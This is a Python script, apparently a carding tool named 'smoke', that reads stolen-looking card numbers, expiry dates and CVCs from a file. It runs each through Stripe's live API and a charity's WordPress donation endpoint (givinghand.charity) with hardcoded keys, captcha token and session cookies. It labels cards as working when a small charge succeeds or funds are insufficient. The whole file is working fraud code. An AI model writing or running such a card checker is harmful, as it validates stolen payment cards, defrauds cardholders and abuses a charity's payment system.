import requests
import user_agent
import telebot,time
from user_agent import generate_user_agent
user_agent = generate_user_agent()
import pyfiglet
file=open('smoke.txt',"+r")
O =  '\033[1;31m' #Red
Z =  '\033[1;37m' #white
F = '\033[1;32m' #Green
B = '\033[2;36m' #Light Blue
X = '\033[1;33m' #Yellow
C = '\033[2;35m' #Purpl
R = '\033[5;31m' #Red
logo = pyfiglet.figlet_format('smoke')

print(X+logo)

lo=(" ----------- ")
print(C+lo)
start_num = 0
for P in file.readlines():
	start_num += 1
	n = P.split('|')[0]
	mm=P.split('|')[1]
	yy=P.split('|')[2][-2:]
	cvc=P.split('|')[3].replace('\n', '')
	P=P.replace('\n', '')
	headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
}

	data = f'type=card&billing_details[name]=smoke+smoke&billing_details[email]=a45709493%40gmail.com&billing_details[address][line1]=505+N+Main+St&billing_details[address][line2]=505+N+Main+St&billing_details[address][city]=Meridian&billing_details[address][state]=NY&billing_details[address][postal_code]=10001&billing_details[address][country]=US&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=2e904a6d-ead0-478a-8106-19591a2d507b5be851&muid=08554cc8-2c22-4764-88ea-094c8c6f75e3567576&sid=231c82a3-737c-4ec4-b7cc-5402cca9074bfb0d2d&payment_user_agent=stripe.js%2F50ba0a1035%3B+stripe-js-v3%2F50ba0a1035%3B+card-element&referrer=https%3A%2F%2Fgivinghand.charity&time_on_page=8209&key=pk_live_51Oo8yRK1XnH7l7ooUZvgdm1OY9mZ96hwxveVZrpiMi6kg0oPDzcwWFsTij3B2MAMLaNrJOcUbkfg5wJlglbhg34N00GvOmUclN&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZWpfKDC4YhuS5jLyY2V230pblcO7AAqMiRblo5rV-GCunmoHg9MSZ6u4XnJPPAe007JiFIwoIndiUKciMZXDavn6DPdRGjJHXYli0SgXP28Se_5MeXiTBJU8uvsCsrVhiIbyBlqS6laXsjdQO--qGekXTbmLeO3huRg18s-t18R7ZSAeprJdV5fIFrS0Dlv1wMX7UTq9_m2krJ2Uyfkm9LSZ_yJmO8-tMxPLfXXE4QWebsf8dy-qMS25lZS7oU-6vADa-zOzse0yoEDXgQT_sswZuwbeGDNp9ejAJubmMgu5zfejV7oj2fJanjHDAb6EHgLeXfVvVaiDl2a3Fx1ZdqzJlmT2YgE_VznZCo4nGO3R6kWe4oPAWDpLwPZI1eEZ5HUvV9HUGBRAPje4BhLvQlO4Pje5WW4b9x2wkc1EfLZDmOgrBq3ghZy2XYPMY4xABLJoipGbRAVcQfrw0LRmxO84eCUcPFaH3O-lMb3VBroG-CT1OLU-FB1CdkA0x9pmcmOll1LLa2VVkuyIZc6DyQzED6kIs4DCm7wGDJMP7exPQP_me2OWbVvofu2T2Tlt4GCsw-2Rad_wtPBk4DuLBZzZWPMAg59IfBTcRtI6kEpRUn6WD7tQBAUeqgXRuiumf3amHyDOQgO0HmTztSVmhdxGDhnfAlaJKO0Taa7qyofoEAj6VDZBXWb-MmgpJkTb6ZoZ8uvltYjEQPoOHG5MFVkM4CTTFKv5Wy0Fn-qwNx9la0_muYmE_po3mjI2OnTV8giPreEgSJmIV4SmUfNPw4O-4_1djrhyZC-MaB5CnllEgKT408X6nWhpZmBDN4qyGTGblGTkhOl3-vzE-2Ah2MRpX9Teg35Gh0TvprK5TcL60v7-0jcW5vRAhBgGbThowdPmcvqMliwrZ_E6vO0BvvTib_OZ8a_cVY9EzfF0AwMFboQKRkWWynqfOxSFPxOKLBDhZC8qrKhsK6UQwON_QAWyqIizXDQBXUqvIR75IxQVQ8h24nzbzUOT3fUjAwMWXjkVSmaKi7rTP0xaA3mXCMnzjE2TA9GihbRM-hlv6-HtP6SOmH9DRtMuKtKsGCa0yFZ1q2owZ9VKi5TQK1vZexq0RGnr_s9ODR1sCyeO0XqYX21RCOjm64OAj9KdCJWw9tUW2zEnBlyRVHOJMHeU5GUmn3CTUg6G4o8os1YZBGg7GwZCvVOUse3hwNZnuf1YXeMJ-sexY6tGkENPbWQJAg6nnhT5CFIBUWBPP73R9KJQO-0h9nPpSBJ5i2Q46dZL-fAyADpDIcR2RoKlkcgVtgB0I2pcT456a7Z97vInyz1zvXoBGXAG9CFgEEGfj2OScVM_hOTJEeddiDPZrS71QhXH4aFHqnLTmU2CmOseVaJHUHRxEJq47EGdGwcIyiIJS1Q8bhVtLCev_xq-C1_00O9asqUkiPIOKDf4iZkmiQjsH0J13FkvNd9T9ZZq2Hj2EWpa6jfOf7bGiNcQ-v58cXzRWVbjnrRxb5inkQBVTz0ogvAWOzPVl7jQ4tOze_B9RyZWJJe4KbxDIie693RpxpokXCZGHL8debOstIKLskXIrkAndb79z6dSEsFSy2r7DVUaXaI18ptQ2NAuea3aCF8I_yhWW15097M5O4wtbHPDfFi0dfgNHZNABmUEDvMvNaX6AFtSlXT1ypmqGrVOmNsHFgidwuakrBoXeb1HB9F2omsfylguE_JdCJOdsjmb3whnS68mujhV9bdTQEP_FFSUpHlHC2s6cnuDT6RGYabXZEuPHyaSPoxWDfSwxaP9CJoVr8xQaHdaraHxF-e7AN367d7GmkASorsbun5g5C68iBZN7qhp-s7Z09RUl4gz-PTa0YUI5lbZK0n9eP3WA6l0JxkJs7P8FE6UGOsQYbFpOpZnmj3sOpuHKqAqqaKIugM3ExjMLSuk3MCYrYwH18c7mwTlwKGa-J3O_QVHh8k62XofGRw8VkAeoojNyoNICuC84g8aMLdoyG9OLQN7gCEDK4YRzeruWZbMI0c4xZI4lDnvitbH8VLHKm2rNl_kY8JZQzgqxxN-QO5Yp7RRiCbtTxuwWmSdNnKLjTmuy2_nbySwYGoadbI3-80draDE5FZAWO7_B6KpAu7viOpdPFKuFL3CyqMLS0ZQ3BspZPqqP3ouluuHqjZXhwzmZZsQioc2hhcmRfaWTOAzGDb6JrcqgzMmQ5ZjM3ZKJwZAA.qKWZ8_XOpo7qduMKOiT-KklUGdzpC32yajSUjIOxk74'

	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	id=(response.json()['id'])
	cookies = {
    'i3CURRENCY': 'GBP',
    'i3CID': 'f56b03f6-01bf-4623-9241-eb6f37408829',
    '_ga': 'GA1.1.2008434536.1716936368',
    '__stripe_mid': '08554cc8-2c22-4764-88ea-094c8c6f75e3567576',
    'PHPSESSID': 'dcjp4lih9ec9brafm57cqmosjs',
    'cf_clearance': 'yj4MYnvnLeJkPR7jQNuLhXZ7MjY92maP1OdXfB4P_Ys-1717153873-1.0.1.1-m5RV9hpahFeDO.DKUsZKIE_RSHz84q7VtkX5m2.rTs8s5sCnKlZiuiOjly7DrhUh4h.eKZe3XEgU_mN6Y.STIA',
    '__stripe_sid': '231c82a3-737c-4ec4-b7cc-5402cca9074bfb0d2d',
    'i3d-statement': 'f56b03f6-01bf-4623-9241-eb6f37408829',
    '_ga_L9VVPNYMBN': 'GS1.1.1717153873.6.1.1717153935.0.0.0',
}

	headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'i3CURRENCY=GBP; i3CID=f56b03f6-01bf-4623-9241-eb6f37408829; _ga=GA1.1.2008434536.1716936368; __stripe_mid=08554cc8-2c22-4764-88ea-094c8c6f75e3567576; PHPSESSID=dcjp4lih9ec9brafm57cqmosjs; cf_clearance=yj4MYnvnLeJkPR7jQNuLhXZ7MjY92maP1OdXfB4P_Ys-1717153873-1.0.1.1-m5RV9hpahFeDO.DKUsZKIE_RSHz84q7VtkX5m2.rTs8s5sCnKlZiuiOjly7DrhUh4h.eKZe3XEgU_mN6Y.STIA; __stripe_sid=231c82a3-737c-4ec4-b7cc-5402cca9074bfb0d2d; i3d-statement=f56b03f6-01bf-4623-9241-eb6f37408829; _ga_L9VVPNYMBN=GS1.1.1717153873.6.1.1717153935.0.0.0',
    'origin': 'https://givinghand.charity',
    'priority': 'u=1, i',
    'referer': 'https://givinghand.charity/checkout/payment-processing/?statement_id=f56b03f6-01bf-4623-9241-eb6f37408829&gateway=stripe_intent',
    'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

	data = {
    'action': 'get_single_intent',
    'payment_method_id': id,
    'statement_id': 'f56b03f6-01bf-4623-9241-eb6f37408829',
}

	response = requests.post('https://givinghand.charity/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)

	try:
		if "insufficient funds" in response.text or "Payment success" in response.text or "Payment Completed." in response.text or "Thank you for your support." in response.text:
			#if Completed / thank you  its charged 1$
			print(F+f'[ {start_num} ]',P,' ➜ ',response.json())
		else:
			print(R+f'[ {start_num} ]',P,' ➜ ',response.json())
	except:
		print(response.text)        
    
